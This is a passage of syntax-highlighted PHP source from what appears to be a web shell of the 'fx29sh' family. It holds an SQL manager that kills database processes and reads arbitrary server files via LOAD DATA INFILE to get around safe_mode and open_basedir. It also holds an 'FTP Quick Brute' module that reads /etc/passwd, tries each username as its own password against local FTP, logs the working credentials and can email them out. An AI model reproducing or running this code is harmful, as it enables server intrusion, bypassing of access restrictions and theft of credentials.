           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
           <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;processes&quot;</span><span class="p">)</span> <span class="p">{</span>
           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$kill</span><span class="p">))</span> <span class="p">{</span>
             <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;KILL &quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span>
             <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
             <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Process #&quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot; was killed.&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
           <span class="p">}</span>
           <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW PROCESSLIST&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Processes:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;ID&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;USER&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;HOST&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;DB&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;COMMAND&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;TIME&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;STATE&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;INFO&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=processes&amp;kill=&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;Kill&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
           <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;getfile&quot;</span><span class="p">)</span> <span class="p">{</span>
           <span class="nv">$tmpdb</span> <span class="o">=</span> <span class="nv">$sql_login</span><span class="o">.</span><span class="s2">&quot;_tmpdb&quot;</span><span class="p">;</span>
           <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span>
           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$select</span><span class="p">)</span> <span class="p">{</span><span class="nb">mysql_create_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$created</span> <span class="o">=</span> <span class="o">!!</span><span class="nv">$select</span><span class="p">;}</span>
           <span class="k">if</span> <span class="p">(</span><span class="nv">$select</span><span class="p">)</span> <span class="p">{</span>
             <span class="nv">$created</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
             <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );&quot;</span><span class="p">);</span>
             <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;LOAD DATA INFILE </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> INTO TABLE tmp_file&quot;</span><span class="p">);</span>
             <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM tmp_file;&quot;</span><span class="p">);</span>
             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error in reading file (permision denied)!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
             <span class="k">else</span> <span class="p">{</span>
               <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span> <span class="p">}</span>
               <span class="nv">$f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
               <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$f</span> <span class="o">.=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$row</span><span class="p">);</span> <span class="p">}</span>
               <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> does not exists or empty!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
               <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
               <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
               <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DROP TABLE tmp_file;&quot;</span><span class="p">);</span>
             <span class="p">}</span>
           <span class="p">}</span>
           <span class="nb">mysql_drop_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span>
         <span class="p">}</span>
       <span class="p">}</span>
     <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;/tr&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$affected</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_affected_rows</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$affected</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$affected</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$affected</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;tr&amp;gt;&amp;lt;th colspan=2&amp;gt;Affected rows: </span><span class="si">$affected</span><span class="s2">&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;!-- End of SQL Manager --&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ftpquickbrute&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2"> colspan=2&amp;gt;.: Ftp Quick Brute :.&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$fqb_lenght</span><span class="p">))</span> <span class="p">{</span><span class="nv">$fqb_lenght</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;}</span>
      <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t get /etc/passwd for password-list.&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logging</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}</span>
          <span class="nv">$fqb_log</span> <span class="o">=</span> <span class="s2">&quot;FTP Quick Brute (&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;) started at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
        <span class="p">}</span>
        <span class="o">@</span><span class="nb">ob_flush</span><span class="p">();</span>
        <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$ftpquick_st</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
        <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$str</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">2048</span><span class="p">));</span>
          <span class="k">if</span> <span class="p">(</span><span class="nx">fx29ftpbrutecheck</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="nv">$fqb_onlywithsh</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
            <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
            <span class="nb">ob_flush</span><span class="p">();</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$fqb_lenght</span><span class="p">)</span> <span class="p">{</span><span class="k">break</span><span class="p">;}</span>
          <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$success</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No success. connections!&quot;</span><span class="p">;</span> <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;No success. connections!</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="nv">$ftpquick_t</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$ftpquick_st</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;b&amp;gt;Done!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;Success.: &amp;lt;font class=on&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
        <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">------------------------------------------</span><span class="se">\r\n</span><span class="s2">Done!</span><span class="se">\r\n</span><span class="s2">Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Success.: &quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; report&quot;</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">);}</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$logfile</span> <span class="o">=</span> <span class="nv">$tmp_dir</span><span class="o">.</span><span class="s2">&quot;fx29sh_ftpquickbrute_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y_H_i_s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.log&quot;</span><span class="p">;</span>
      <span class="nv">$logfile</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$logfile</span><span class="p">);</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_ftpqb</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">ftpquickbrute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;Read first:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text name=</span><span class="se">\&quot;</span><span class="s2">fqb_lenght</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwdperpage</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_onlywithsh</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt; Users only with shell&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logging</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;Logging&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Logging to file:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logfile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$logfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
